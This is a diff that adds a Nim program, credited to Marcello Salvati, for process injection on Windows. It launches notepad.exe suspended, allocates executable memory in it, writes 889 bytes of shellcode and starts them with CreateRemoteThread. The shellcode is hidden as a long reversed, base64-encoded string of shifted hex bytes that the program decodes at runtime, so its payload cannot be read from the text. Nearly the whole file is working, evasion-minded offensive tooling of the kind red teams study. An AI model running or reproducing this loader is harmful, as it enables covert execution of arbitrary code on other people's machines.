@@ -1,0 +1,94 @@
+#[
+    Author: Marcello Salvati, Twitter: @byt3bl33d3r
+    License: BSD 3-Clause
+]#
+
+import winim/lean
+import osproc
+import base64
+import strutils
+import sequtils
+
+proc injectCreateRemoteThread[I, T](shellcode: array[I, T]): void =
+
+    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
+    let tProcess = startProcess("notepad.exe")
+    tProcess.suspend() # That's handy!
+    defer: tProcess.close()
+
+    echo "[*] Target Process: ", tProcess.processID
+
+    let pHandle = OpenProcess(
+        PROCESS_ALL_ACCESS, 
+        false, 
+        cast[DWORD](tProcess.processID)
+    )
+    defer: CloseHandle(pHandle)
+
+    echo "[*] pHandle: ", pHandle
+
+    let rPtr = VirtualAllocEx(
+        pHandle,
+        NULL,
+        cast[SIZE_T](shellcode.len),
+        MEM_COMMIT,
+        PAGE_EXECUTE_READ_WRITE
+    )
+
+    var bytesWritten: SIZE_T
+    let wSuccess = WriteProcessMemory(
+        pHandle, 
+        rPtr,
+        unsafeAddr shellcode,
+        cast[SIZE_T](shellcode.len),
+        addr bytesWritten
+    )
+
+    echo "[*] WriteProcessMemory: ", bool(wSuccess)
+    echo "    \\-- bytes written: ", bytesWritten
+    echo ""
+
+    let tHandle = CreateRemoteThread(
+        pHandle, 
+        NULL,
+        0,
+        cast[LPTHREAD_START_ROUTINE](rPtr),
+        NULL, 
+        0, 
+        NULL
+    )
+    defer: CloseHandle(tHandle)
+
+    echo "[*] tHandle: ", tHandle
+    echo "[+] Injected"
+
+proc reverse(str: string): string =
+    result = ""
+    for i in countdown(str.high, 0):
+        result.add(str[i])
+
+when defined(windows):
+
+    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
+    when defined(i386):
+        echo "[*] Running in x86 process"
+        quit()
+
+    elif defined(amd64):
+        echo "[*] Running in x64 process"
+
+        let dat2 = "==gCwUDewACLycDewACLjNGewACL3YDewACLxADewACL0MDewACL5MDewACLyMDewACLmJDewACLxMDewACLmJDewACLxMDewACLmJDewACLxMDewACLyMDewACLwATM4BDIsADMxgHMgwSZmhHMgwCMhhHMgwSOlhHMgwCNjhHMgwSM1gHMgwSMwgHMgwSMwgHMgwSMwgHMgwSMwgHMgwiNwgHMgwSO0gHMgwSO1gHMgwSO1gHMgwSO1gHMgwCOkhHMgwiN3gHMgwSMjhHMgwiN4gHMgwCNjhHMgwiMwgHMgwSO0gHMgwCOwgHMgwyY4gHMgwyN2gHMgwyNihHMgwSN3gHMgwSMjhHMgwiN4gHMgwSMygHMgwSNjhHMgwCN4gHMgwSO0gHMgwiNkhHMgwCMwEDewACLzUGewACLhhDewACL3kDewACLzEDewACLiJGewACLyQDewACLhZGewACLhhDewACLhRDewACLxADewACLxADewACLxIDewACLxADewACL5IGewACLyQDewACLiRGewACLhhDewACL5QDewACLyYGewACLhhDewACL5QDewACL4UGewACLhhDewACL5QDewACL0UDewACL0UDewACL0kDewACL5QDewACL2QGewACLwATM4BDIsYTZ4BDIsQTN4BDIsUTY4BDIskTN4BDIsImY4BDIsIDN4BDIsEDM4BDIsEDM4BDIsEDM4BDIsEDN4BDIsEmY4BDIsIDN4BDIsEDM4BDIsEDM4BDIsETM4BDIsEDM4BDIskjY4BDIsIDN4BDIsEDM4BDIsEDN4BDIsEDM4BDIsEDM4BDIsImY4BDIsE2Y4BDIsIzM4BDIskDN4BDIsYDZ4BDIsADMxgHMgwyN1gHMgwyMhhHMgwiNihHMgwSMmhHMgwiZihHMgwiM0gHMgwSMwgHMgwSZxgHMgwiM5gHMgwCOihHMgwCNygHMgwiZmhHMgwCNjhHMgwiZhhHMgwiN5gHMgwCNihHMgwiN1gHMgwyN4gHMgwiNxgHMgwCZjhHMgwyM0gHMgwSOjhHMgwCM1gHMgwCNxgHMgwiN4gHMgwyYygHMgwiYzgHMgwSN3gHMgwCM3gHMgwSY1gHMgwCZkhHMgwiNhhHMgwiMihHMgwSNxgHMgwCO1gHMgwyNzgHMgwiY1gHMgwSOygHMgwiZ5gHMgwSN0gHMgwSO2gHMgwSNzgHMgwCO4gHMgwyMygHMgwiZ5gHMgwiZ0gHMgwyMkhHMgwiN5gHMgwyM1gHMgwSMihHMgwSY2gHMgwCMhhHMgwyYwgHMgwiZ2gHMgwSN2gHMgwCO4gHMgwCO1gHMgwSNygHMgwSN4gHMgwyM0gHMgwyMzgHMgwyN1gHMgwiYhhHMgwCM0gHMgwyNkhHMgwyMihHMgwiN5gHMgwCMkhHMgwyMihHMgwyM0gHMgwSNihHMgwSNwgHMgwSMygHMgwyNxgHMgwSZ3gHMgwyNhhHMgwiM4gHMgwyYygHMgwSO3gHMgwSZ1gHMgwyNhhHMgwyMhhHMgwSNlhHMgwiZ2gHMgwSOhhHMgwCN3gHMgwyNzgHMgwCO1gHMgwiZxgHMgwSOygHMgwyY2gHMgwCZygHMgwSYhhHMgwSOjhHMgwyN4gHMgwiYlhHMgwCZjhHMgwiM5gHMgwCM5gHMgwiMzgHMgwCN2gHMgwiNygHMgwiMjhHMgwCZkhHMgwSM1gHMgwiNhhHMgwSZlhHMgwiM1gHMgwCO0gHMgwSNxgHMgwyNhhHMgwCOjhHMgwCOxgHMgwiMhhHMgwyNkhHMgwCZzgHMgwSO0gHMgwSOygHMgwiY2gHMgwiY2gHMgwyYhhHMgwSZxgHMgwiNzgHMgwiNkhHMgwyMhhHMgwSN5gHMgwSNhhHMgwiNygHMgwyYhhHMgwiZ5gHMgwCZlhHMgwSZxgHMgwyYxgHMgwyMjhHMgwSO4gHMgwiYlhHMgwiY4gHMgwiZ0gHMgwiYhhHMgwSY1gHMgwSMmhHMgwCO4gHMgwiZxgHMgwSOihHMgwSY1gHMgwSMkhHMgwyY4gHMgwSO2gHMgwSY2gHMgwCNjhHMgwSN0gHMgwiM3gHMgwSOkhHMgwCOhhHMgwyYlhHMgwSNwgHMgwSYmhHMgwCMzgHMgwyNzgHMgwiN1gHMgwSYxgHMgwiMihHMgwiNxgHMgwiNhhHMgwSN5gHMgwCM2gHMgwCOlhHMgwSO2gHMgwCMkhHMgwCOwgHMgwSMzgHMgwSMwgHMgwCM3gHMgwiZ3gHMgwCMhhHMgwCOygHMgwCN1gHMgwSN1gHMgwCMihHMgwSZ0gHMgwCOygHMgwCOlhHMgwiN1gHMgwiNihHMgwCOwgHMgwCZhhHMgwyYkhHMgwiN5gHMgwSY5gHMgwSNzgHMgwSMzgHMgwSYmhHMgwSMwgHMgwiMwgHMgwCO2gHMgwSOzgHMgwSYkhHMgwSNygHMgwSOwgHMgwyYzgHMgwSNlhHMgwiY1gHMgwCMygHMgwCZ1gHMgwSYlhHMgwCO0gHMgwSY0gHMgwiMwgHMgwSOwgHMgwiM4gHMgwiZ4gHMgwCMygHMgwiYhhHMgwSMwgHMgwiYwgHMgwSZwgHMgwSYygHMgwSZ0gHMgwiZ0gHMgwiM0gHMgwSZ0gHMgwSMygHMgwyYzgHMgwSZ0gHMgwiZ0gHMgwiM0gHMgwSZ0gHMgwSMygHMgwyYzgHMgwSMzgHMgwiZygHMgwiNzgHMgwCMzgHMgwSN3gHMgwiZ2gHMgwiN2gHMgwSN2gHMgwSY2gHMgwyM3gHMgwSN1gHMgwSMygHMgwyYzgHMgwSNzgHMgwyNzgHMgwCO1gHMgwCM1gHMgwCO1gHMgwSMygHMgwyYzgHMgwiMzgHMgwiZygHMgwyNzgHMgwSMygHMgwSN1gHMgwiZ0gHMgwSMygHMgwCN3gHMgwCO3gHMgwCM3gHMgwSN2gHMgwiZ2gHMgwSY2gHMgwCO1gHMgwSMygHMgwyYzgHMgwSMzgHMgwiZygHMgwSYzgHMgwSMygHMgwiN0gHMgwSY0gHMgwCN1gHMgwSZ0gHMgwSMygHMgwyYzgHMgwiN2gHMgwCZ2gHMgwyM2gHMgwSY2gHMgwSN3gHMgwiM2gHMgwSM3gHMgwSZ2gHMgwCM3gHMgwCN2gHMgwSOygHMgwSMygHMgwSMzgHMgwiZygHMgwiNzgHMgwCMzgHMgwiM2gHMgwCZ2gHMgwCZ2gHMgwSY2gHMgwiY3gHMgwCM3gHMgwSZ0gHMgwSMygHMgwiYzgHMgwSN3gHMgwiZ2gHMgwiN2gHMgwCO2gHMgwiM0gHMgwSZygHMgwyM3gHMgwiN2gHMgwCN3gHMgwiN1gHMgwSMwgHMgwSM3gHMgwCZwgHMgwiM0gHMgwCO4gHMgwyYihHMgwCN5gHMgwCOzgHMgwiYihHMgwCNkhHMgwiM0gHMgwyYlhHMgwyMlhHMgwCMihHMgwSM3gHMgwyNkhHMgwSNkhHMgwSNzgHMgwyM5gHMgwyYhhHMgwCO4gHMgwCN3gHMgwiZygHMgwSN4gHMgwCN2gHMgwSZkhHMgwiZkhHMgwiY0gHMgwSY1gHMgwCOlhHMgw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GN4BDIsQDM4BDIsQGN4BDIsIjZ4BDIsYzN4BDIsETZ4BDIskzM4BDIsIzY4BDIsIDM4BDIsIDN4BDIsUGM4BDIsE2Y4BDIsIzY4BDIsIDN4BDIsQWY4BDIsEzY4BDIsIzM4BDIskDN4BDIsE2Y4BDIsIzM4BDIsUGN4BDIscDZ4BDIsIDM4BDIskDN4BDIskDO4BDIsUzM4BDIsMGO4BDIsIDN4BDIsE2Y4BDIsADMxgHMgwSO0gHMgwyN1gHMgwCNlhHMgwSMkhHMgwiMwgHMgwSY0gHMgwSMygHMgwSM0gHMgwyY4gHMgwSN0gHMgwSOxgHMgwSO0gHMgwyY4gHMgwSM1gHMgwSMkhHMgwiMwgHMgwSO0gHMgwCO2gHMgwSN3gHMgwSMjhHMgwiN4gHMgwSO0gHMgwSMwgHMgwSMwgHMgwSMwgHMgwSO4gHMgwSM4gHMgwyY4gHMgwyM3gHMgwiN3gHMgwyMwgHMgwyYwgHMgwSOxgHMgwSO3gHMgwiM4gHMgwyN2gHMgwSMkhHMgwiMwgHMgwSO0gHMgwCZzgHMgwyM0gHMgwyY4gHMgwSMygHMgwyM1gHMgwyY4gHMgwSO0gHMgwiM1gHMgwiM0gHMgwyM1gHMgwSZlhHMgwyMlhHMgwiMjhHMgwiMwgHMgwiM0gHMgwSZwgHMgwSYjhHMgwiMjhHMgwiM0gHMgwSMygHMgwCZygHMgwyMwgHMgwCZ3gHMgwiM2gHMgwCZzgHMgwCZhhHMgwSMjhHMgwiMzgHMgwSO0gHMgwSYjhHMgwiMzgHMgwSZ0gHMgwiY0gHMgwiY0gHMgwCOihHMgwCMxgHMgwSO0gHMgwSM1gHMgwyM3gHMgwyY4gHMgwSO0gHMgwSMygHMgwyM1gHMgwyY4gHMgwSO0gHMgwSOxgHMgwyM1gHMgwyY4gHMgwSO0gHMgwSM2gHMgwyM1gHMgwyY4gHMgwSO0gHMgwiN2gHMgwyMkhHMgwiMzgHMgwSO0gHMgwyN1gHMgwiM1gHMgwyM1gHMgwSM1gHMgwiM0gHMgwiM1gHMgwiM0gHMgwSMwgHMgwSMwgHMgwSMwgHMgwSOjhHMgwSOlhHMgwSMmhHMgwSNlhHMgwCN4gHMgwSO0gHMgwCZmhHM"
+        
+        let data2 = base64.decode(reverse(dat2)).split(",").map(proc (j:string): string = strip(j)).map(parseHexInt)
+
+        var sc2: array[889, byte]
+        for t in 0..888:
+            sc2[t] = byte data2[t]
+
+        for x in 0..888:
+            sc2[x] -= 0x01
+
+        #echo "Result: ", sc == sc2
+
+    when isMainModule:
+        injectCreateRemoteThread(sc2)
